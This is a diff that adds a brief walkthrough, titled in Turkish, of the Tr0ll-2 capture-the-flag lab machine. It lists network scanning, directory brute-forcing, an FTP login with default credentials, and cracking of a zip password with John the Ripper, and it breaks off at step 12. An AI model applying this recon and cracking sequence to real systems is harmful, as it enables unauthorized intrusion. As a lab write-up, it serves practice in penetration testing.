@@ -1,0 +1,13 @@
+TR0LL-2 MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.39 bulundu.
+2 - nmap -sT -A 192.168.2.39
+3 - gobuster dir -u http://192.168.2.39 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - noob, keep_trying, dont_bother, ok_this_is_it, cat cat_the_troll.jpg (dont_bother), /y0ur_self directory
+5 - http://192.168.2.39/y0ur_self/answer.txt
+6 - base64 -d answer.txt > tr0ll-2-decoded.txt
+7 - ftp 192.168.2.39, Tr0ll:Tr0ll
+8 - zip2john lmao.zip > hash
+9 - john hash -w=tr0ll-2-decoded.txt, ItCantReallyBeThisEasyRightLOL
+10 - unzip lmao.zip
+11 - chmod 600 noob
+12 - 
